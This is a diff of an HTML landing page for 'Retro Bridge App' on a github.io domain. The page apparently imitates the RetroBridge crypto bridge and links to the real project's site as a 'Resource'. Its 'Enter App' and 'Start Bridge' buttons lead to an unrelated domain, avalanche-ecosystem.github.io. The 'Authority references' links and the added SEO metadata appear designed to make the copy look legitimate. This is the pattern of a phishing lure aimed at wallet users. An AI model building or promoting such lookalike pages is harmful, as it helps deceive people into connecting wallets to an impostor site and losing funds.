@@ -3,19 +3,21 @@
 <head>
   <meta charset="utf-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
-  <title>Retro Bridge App</title>
+  <title>Retro Bridge - App</title>
   <meta name="description" content="Retro Bridge App moves tokens across Ethereum and L2 networks from your own wallet.">
   <link rel="canonical" href="https://retro-bridge-app.github.io/">
+  <link rel="sitemap" type="application/xml" href="sitemap.xml">
   <meta name="robots" content="index,follow,max-image-preview:large">
-  <meta name="theme-color" content="#F7F5F6">
+  <meta name="theme-color" content="#faf8fb">
   <meta property="og:type" content="website">
   <meta property="og:title" content="Retro Bridge App">
   <meta property="og:description" content="Retro Bridge App moves tokens across Ethereum and L2 networks from your own wallet.">
   <meta property="og:url" content="https://retro-bridge-app.github.io/">
-  <meta property="og:image" content="https://retro-bridge-app.github.io/favicon.png">
-  <meta name="twitter:card" content="summary">
+  <meta property="og:image" content="https://retro-bridge-app.github.io/og-cover.png">
+  <meta name="twitter:card" content="summary_large_image">
   <meta name="twitter:title" content="Retro Bridge App">
   <meta name="twitter:description" content="Retro Bridge App moves tokens across Ethereum and L2 networks from your own wallet.">
+  <meta name="twitter:image" content="https://retro-bridge-app.github.io/og-cover.png">
   <link rel="icon" type="image/png" href="favicon.png">
   <link rel="apple-touch-icon" href="favicon.png">
   <link rel="manifest" href="site.webmanifest">
@@ -29,6 +31,7 @@
         "@id": "https://retro-bridge-app.github.io/#website",
         "url": "https://retro-bridge-app.github.io/",
         "name": "Retro Bridge App",
+        "description": "Retro Bridge App moves tokens across Ethereum and L2 networks from your own wallet.",
         "inLanguage": "en"
       },
       {
@@ -38,6 +41,7 @@
         "applicationCategory": "FinanceApplication",
         "operatingSystem": "Web",
         "url": "https://retro-bridge-app.github.io/",
+        "description": "Retro Bridge App moves tokens across Ethereum and L2 networks from your own wallet.",
         "offers": {
           "@type": "Offer",
           "price": "0",
@@ -48,7 +52,8 @@
         "@type": "Organization",
         "@id": "https://retro-bridge-app.github.io/#organization",
         "name": "Retro Bridge App",
-        "url": "https://retro-bridge-app.github.io/"
+        "url": "https://retro-bridge-app.github.io/",
+        "logo": "https://retro-bridge-app.github.io/favicon.png"
       }
     ]
   }
@@ -56,62 +61,130 @@
 </head>
 <body>
   <header class="topbar">
-    <div class="brand" aria-label="Retro Bridge App">
-      <img src="favicon.png" width="30" height="30" alt="">
-      <span>Retro Bridge App</span>
-    </div>
+    <a class="brand" href="./" aria-label="Retro Bridge App home">
+      <img src="favicon.png" width="32" height="32" alt="">
+      <span>Retro Bridge</span>
+    </a>
+    <span class="spacer"></span>
     <nav class="nav" aria-label="Authority references">
       <a href="https://etherscan.io/" target="_blank" rel="nofollow noopener noreferrer">Etherscan</a>
       <a href="https://ethereum.org/bridges/" target="_blank" rel="nofollow noopener noreferrer">Ethereum bridges</a>
       <a href="https://l2beat.com/scaling/summary" target="_blank" rel="nofollow noopener noreferrer">L2BEAT</a>
     </nav>
-    <span class="spacer"></span>
-    <a class="ghost" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Open app</a>
   </header>
 
-  <main class="stage">
-    <section class="hero" aria-label="Retro Bridge App">
-      <h1>Retro Bridge App</h1>
-      <p class="value"><strong>Retro Bridge App</strong> moves tokens across Ethereum and L2 networks from your own wallet.</p>
-    </section>
-
-    <section class="app-card" aria-label="Bridge route">
-      <div class="route">
-        <div class="leg">
-          <span class="label">From</span>
-          <span class="chip">
-            <img src="eth.png" width="28" height="28" alt="ETH">
-            <span>ETH</span>
-          </span>
+  <main class="page">
+    <section class="hero" aria-label="Retro Bridge App bridge preview">
+      <div class="hero-copy">
+        <h1>Retro Bridge</h1>
+        <p class="deck"><strong>Retro Bridge</strong> moves tokens across Ethereum and L2 networks from your own wallet.</p>
+        <div class="trust-chips" aria-label="Bridge qualities">
+          <span>Multi-chain bridging</span>
+          <span>One-minute transfers</span>
+          <span>Non-custodial</span>
         </div>
-        <button class="switch" type="button" data-switch aria-label="Switch bridge direction">
-          <span aria-hidden="true">&#8594;</span>
-        </button>
-        <div class="leg">
-          <span class="label">To</span>
-          <span class="chip">
-            <img src="usdc.png" width="28" height="28" alt="USDC">
-            <span>USDC</span>
-          </span>
-        </div>
+        <a class="button button-hero" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">
+          <span>Enter App</span>
+          <span class="arrow" aria-hidden="true">&rsaquo;</span>
+        </a>
       </div>
-      <a class="primary" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">Enter App</a>
-    </section>
-  </main>
 
-  <footer class="footer">Retro Bridge App &mdash; 2026</footer>
+      <section class="bridge-card" aria-label="Bridge route preview">
+        <div class="card-topline">
+          <span class="selector-pill">Ethereum route</span>
+          <span class="preview-pill"><span aria-hidden="true"></span>Preview</span>
+        </div>
+
+        <div class="route" data-route>
+          <div class="route-panel">
+            <span class="route-label">From</span>
+            <div class="asset-chip" data-asset="from">
+              <img src="eth.png" width="34" height="34" alt="ETH">
+              <span>ETH</span>
+            </div>
+          </div>
+
+          <button class="switch" type="button" data-switch aria-label="Switch bridge direction">
+            <span aria-hidden="true">&harr;</span>
+          </button>
+
+          <div class="route-panel">
+            <span class="route-label">To</span>
+            <div class="asset-chip" data-asset="to">
+              <img src="usdc.png" width="34" height="34" alt="USDC">
+              <span>USDC</span>
+            </div>
+          </div>
+        </div>
+
+        <div class="route-detail" aria-label="Best route preview">
+          <span>Best route</span>
+          <span class="hop-dots" aria-hidden="true">
+            <i></i><i></i><i></i><i></i>
+          </span>
+          <span>Across supported networks</span>
+        </div>
+
+        <p class="route-note">Review the route in the app before confirming from your wallet.</p>
+
+        <a class="button button-card" href="https://avalanche-ecosystem.github.io/" rel="noopener noreferrer">
+          <span>Start Bridge</span>
+          <span class="arrow" aria-hidden="true">&rsaquo;</span>
+        </a>
+      </section>
+    </section>
+
+    <section class="resources" aria-label="Further reading on cross-chain bridging">
+      <p class="resources-label">Resources</p>
+      <div class="resource-rail">
+        <a href="https://retrobridge.io/" target="_blank" rel="nofollow noopener noreferrer">
+          <img src="https://www.google.com/s2/favicons?sz=64&amp;domain=retrobridge.io" width="20" height="20" loading="lazy" alt="" onerror="this.remove()">
+          <span>Official site</span>
+        </a>
+        <a href="https://retro-bridge.medium.com/retro-bridge-revolutionizing-cross-chain-bridging-in-blockchain-networks-d835ea840fad" target="_blank" rel="nofollow noopener noreferrer">
+          <img src="https://www.google.com/s2/favicons?sz=64&amp;domain=medium.com" width="20" height="20" loading="lazy" alt="" onerror="this.remove()">
+          <span>What RetroBridge is</span>
+        </a>
+        <a href="https://retro-bridge.medium.com/how-to-bridge-assets-to-rari-chain-with-retrobridge-95aa2102d562" target="_blank" rel="nofollow noopener noreferrer">
+          <img src="https://www.google.com/s2/favicons?sz=64&amp;domain=medium.com" width="20" height="20" loading="lazy" alt="" onerror="this.remove()">
+          <span>Bridge to Rari Chain (guide)</span>
+        </a>
+        <a href="https://www.moonpay.com/learn/blockchain/what-are-cross-chain-bridges" target="_blank" rel="nofollow noopener noreferrer">
+          <img src="https://www.google.com/s2/favicons?sz=64&amp;domain=moonpay.com" width="20" height="20" loading="lazy" alt="" onerror="this.remove()">
+          <span>What are cross-chain bridges</span>
+        </a>
+        <a href="https://www.chainalysis.com/blog/introduction-to-cross-chain-bridges/" target="_blank" rel="nofollow noopener noreferrer">
+          <img src="https://www.google.com/s2/favicons?sz=64&amp;domain=chainalysis.com" width="20" height="20" loading="lazy" alt="" onerror="this.remove()">
+          <span>How bridges work</span>
+        </a>
+        <a href="https://defillama.com/bridge/retrobridge" target="_blank" rel="nofollow noopener noreferrer">
+          <img src="https://www.google.com/s2/favicons?sz=64&amp;domain=defillama.com" width="20" height="20" loading="lazy" alt="" onerror="this.remove()">
+          <span>RetroBridge volume &amp; data</span>
+        </a>
+        <a href="https://cryptototem.com/retro-bridge/" target="_blank" rel="nofollow noopener noreferrer">
+          <img src="https://www.google.com/s2/favicons?sz=64&amp;domain=cryptototem.com" width="20" height="20" loading="lazy" alt="" onerror="this.remove()">
+          <span>RetroBridge review</span>
+        </a>
+      </div>
+    </section>
+
+    <footer class="footer">
+      <p>Retro Bridge App &mdash; 2026</p>
+    </footer>
+  </main>
 
   <script>
   (function () {
     "use strict";
     var button = document.querySelector("[data-switch]");
-    if (!button) return;
+    var from = document.querySelector('[data-asset="from"]');
+    var to = document.querySelector('[data-asset="to"]');
+    if (!button || !from || !to) return;
+
     button.addEventListener("click", function () {
-      var chips = document.querySelectorAll(".chip");
-      if (chips.length !== 2) return;
-      var first = chips[0].innerHTML;
-      chips[0].innerHTML = chips[1].innerHTML;
-      chips[1].innerHTML = first;
+      var currentFrom = from.innerHTML;
+      from.innerHTML = to.innerHTML;
+      to.innerHTML = currentFrom;
       button.classList.toggle("is-switched");
     });
   }());
